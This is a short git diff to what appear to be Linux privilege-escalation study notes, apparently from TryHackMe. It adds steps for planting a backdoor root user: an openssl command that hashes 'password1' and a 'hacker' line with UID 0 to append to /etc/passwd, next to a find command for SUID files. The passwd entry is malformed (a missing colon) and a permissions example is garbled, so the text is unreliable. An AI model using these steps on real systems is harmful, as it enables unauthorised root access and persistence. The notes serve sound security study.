@@ -156,6 +156,18 @@ Eg : -rwsr-wr-rwx root bin/bash/nano
 
 `find / -type f -perm -04000 -ls 2>/dev/null` will list files that have SUID or SGID bits set.
 
+# Adding a new user with root priv in Linux
+
+1. We will need the hash value of the password we want the new user to have. This can be done quickly using the `openssl` tool on Kali Linux.
+
+`openssl passwd -1 -salt THM password1` "password1" is our password
+
+2. We will then add this password with a username to the `/etc/passwd` file.
+
+`hacker:$1$THM$WnbwlliCqxFRQepUTCkUT1:0:0root:/root:/bin/bash`
+
+
+
 
 
 
